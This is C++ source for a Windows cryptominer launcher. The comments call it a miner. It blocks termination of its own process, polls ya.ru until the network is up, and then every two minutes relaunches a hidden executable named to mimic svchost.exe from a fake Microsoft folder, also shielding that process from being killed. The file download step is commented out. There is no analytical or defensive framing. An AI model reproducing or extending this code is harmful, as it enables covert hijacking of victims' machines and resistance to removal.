#include "stdafx.h"
#include "Utils.h"
#include <Wininet.h>
#pragma comment (lib, "Kernel32.lib")
#pragma comment (lib, "Wininet.lib")

using namespace std;

Utils utils;

void RestoreFiles()
{
	//utils.DownloadFile();
}

void Start()
{
	//utils.HideConsole();
	utils.DenyAccessToId(GetCurrentProcessId());

	if (utils.IsProcessRunning(L"Isass.exe"))
	{
		return;
	}

	while (true)
	{
		if (!InternetCheckConnection(L"https://ya.ru", FLAG_ICC_FORCE_CONNECTION, 0))
		{
			// if no internet connection
			Sleep(60000);// sleep 1 minute
		}
		else
		{
			break;
		}
	}

	// if success internet connection, downloading miner files
	RestoreFiles();

	while (true)
	{
		if (!utils.IsProcessRunning(L"scvhost.exe"))
		{
			// if miner not working
			ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Windows\\Network\\scvhost.exe"), 0, 0, SW_HIDE);
			utils.DenyAccessToId(utils.FindProcessId(L"scvhost.exe"));
		}
		Sleep(120000);// two minutes sleep
	}
}

int main()
{
	Start();
	return 0;
}